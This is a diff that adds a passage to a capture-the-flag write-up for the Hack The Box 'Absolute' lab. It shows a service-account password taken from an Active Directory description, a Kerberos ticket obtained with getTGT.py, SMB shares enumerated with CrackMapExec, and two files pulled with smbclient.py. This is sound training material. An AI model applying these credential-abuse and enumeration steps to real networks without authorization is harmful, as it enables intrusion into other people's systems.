@@ -747,6 +747,57 @@ We see a password in the user, svc\_smb's description!
 svc_smb:AbsoluteSMBService123!
 ```
 
+All fingers point to the SMB service. Let's try to enumerate our access with these new creds.
+
+But not too fast now! Remember that <mark style="color:yellow;">**NTLM authentication**</mark> is disabled on this user. We need to grab a <mark style="color:yellow;">TGT</mark> for this user using `getTGT.py` and authenticate it against the services like we did for `d.klay`.
+
+#### getTGT.py
+
+```
+getTGT.py 'absolute.htb/svc_smb:AbsoluteSMBService123!' -dc-ip absolute.htb 
+Impacket v0.10.1.dev1+20230505.184149.c309363e - Copyright 2022 Fortra
+
+[*] Saving ticket in svc_smb.ccache
+```
+
+Copy ticket to Docker:
+
+```
+sudo docker cp svc_smb.ccache cmexec:/usr/src/crackmapexec/svc_smb.ccache
+export KRB5CCNAME=/home/xyconix/Desktop/HTB/Absolute/svc_smb.ccache
+```
+
+#### CrackMapExec SMB share enumeration with svc\_smb
+
+```
+cme smb dc.absolute.htb -u 'svc_smb' -p 'AbsoluteSMBService123!' -k --shares
+```
+
+<figure><img src="../../../.gitbook/assets/image (68).png" alt=""><figcaption></figcaption></figure>
+
+We confirmed that we can use Kerberos to read these files in the shares. Let's use smbclient.py to authenticate with Kerberos and enumerate further.
+
+#### smbclient.py with svc\_smb
+
+```
+Impacket v0.10.1.dev1+20230505.184149.c309363e - Copyright 2022 Fortra
+
+Type help for list of commands
+# ls
+[-] No share selected
+# use Shared
+# ls
+drw-rw-rw-          0  Thu Sep  1 13:02:23 2022 .
+drw-rw-rw-          0  Thu Sep  1 13:02:23 2022 ..
+-rw-rw-rw-         72  Thu Sep  1 13:02:23 2022 compiler.sh
+-rw-rw-rw-      67584  Thu Sep  1 13:02:23 2022 test.exe
+# get compiler.sh
+# get test.exe
+# exit
+```
+
+We see 2 files, <mark style="color:yellow;">compiler.sh</mark> and <mark style="color:yellow;">test.exe</mark>.
+
 ## Privilege Escalation
 
 ### Local enumeration
